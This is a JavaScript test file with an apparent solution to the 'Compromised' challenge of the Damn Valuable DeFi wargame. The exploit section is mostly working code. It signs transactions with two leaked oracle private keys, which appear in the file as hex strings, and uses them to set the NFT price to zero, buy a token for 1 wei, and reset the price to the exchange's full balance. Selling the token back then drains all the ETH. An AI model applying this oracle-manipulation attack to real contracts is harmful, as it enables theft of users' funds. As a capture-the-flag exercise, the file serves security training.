const { ether, balance } = require('@openzeppelin/test-helpers');
const { accounts, contract, web3 } = require('@openzeppelin/test-environment');

const Exchange = contract.fromArtifact('Exchange');
const DamnValuableNFT = contract.fromArtifact('DamnValuableNFT');
const TrustfulOracle = contract.fromArtifact('TrustfulOracle');
const TrustfulOracleInitializer = contract.fromArtifact('TrustfulOracleInitializer');

const { expect } = require('chai');

describe('Compromised challenge', function () {

    const sources = [
        '0xA73209FB1a42495120166736362A1DfA9F95A105',
        '0xe92401A4d3af5E446d93D11EEc806b1462b39D15',
        '0x81A5D6E50C214044bE44cA0CB057fe119097850c'
    ];

    const [deployer, attacker] = accounts;
    const EXCHANGE_INITIAL_ETH_BALANCE = ether('10000');
    const INITIAL_NFT_PRICE = ether('999');

    before(async function () {
        /** SETUP - NO NEED TO CHANGE ANYTHING HERE */

        // Fund the trusted source addresses
        await web3.eth.sendTransaction({ from: deployer, to: sources[0], value: ether('5') });
        await web3.eth.sendTransaction({ from: deployer, to: sources[1], value: ether('5') });
        await web3.eth.sendTransaction({ from: deployer, to: sources[2], value: ether('5') });

        // Deploy the oracle and setup the trusted sources with initial prices
        this.oracle = await TrustfulOracle.at(
            await (await TrustfulOracleInitializer.new(
                sources,
                ["DVNFT", "DVNFT", "DVNFT"],
                [INITIAL_NFT_PRICE, INITIAL_NFT_PRICE, INITIAL_NFT_PRICE],
                { from: deployer }
            )).oracle()
        );

        // Deploy the exchange and get the associated ERC721 token
        this.exchange = await Exchange.new(
            this.oracle.address,
            { from: deployer, value: EXCHANGE_INITIAL_ETH_BALANCE }
        );
        this.token = await DamnValuableNFT.at(await this.exchange.token());
    });

    it('Exploit', async function () {
        /** YOUR EXPLOIT GOES HERE */

        // such a cool challenge!!

        // web response contains encoded private keys for 2 out of the 3 oracle addresses (hex->ascii->base64->privkey)
        // so we can manipulate the oracle prices.

        //oracle1 = await web3.eth.accounts.privateKeyToAccount('0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9');
        oracle2 = await web3.eth.accounts.privateKeyToAccount('0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48');

        let data = web3.eth.abi.encodeFunctionCall({
            name: 'postPrice',
            type: 'function',
            inputs: [{
                type: 'string',
                name: 'symbol'
            },{
                type: 'uint256',
                name: 'newPrice'
            }]
        }, ['DVNFT', 0]);
        let tx = {
            to: this.oracle.address,
            data: data,
            gas: 1000000
        };
        let msg1 = await web3.eth.accounts.signTransaction(tx, '0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9');
        let msg2 = await web3.eth.accounts.signTransaction(tx, '0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48');
        await web3.eth.sendSignedTransaction(msg1.rawTransaction);
        await web3.eth.sendSignedTransaction(msg2.rawTransaction);

        let id = await this.exchange.buyOne({ value: 1, from: attacker });

        let data2 = web3.eth.abi.encodeFunctionCall({
            name: 'postPrice',
            type: 'function',
            inputs: [{
                type: 'string',
                name: 'symbol'
            },{
                type: 'uint256',
                name: 'newPrice'
            }]
        }, ['DVNFT', await web3.eth.getBalance(this.exchange.address)]);

        let tx2 = {
            to: this.oracle.address,
            data: data2,
            gas: 1000000
        };

        let msg3 = await web3.eth.accounts.signTransaction(tx2, '0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9');
        let msg4 = await web3.eth.accounts.signTransaction(tx2, '0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48');
        await web3.eth.sendSignedTransaction(msg3.rawTransaction);
        await web3.eth.sendSignedTransaction(msg4.rawTransaction);

        await this.token.approve(this.exchange.address, id.logs[0].args.tokenId, { from: attacker });
        await this.exchange.sellOne(id.logs[0].args.tokenId, { from: attacker });
    });

    after(async function () {
        // Exchange must have lost all ETH
        expect(
            await balance.current(this.exchange.address)
        ).to.be.bignumber.eq('0');
        expect(
            await balance.current(attacker)
        ).to.be.bignumber.gt(EXCHANGE_INITIAL_ETH_BALANCE);
    });
});
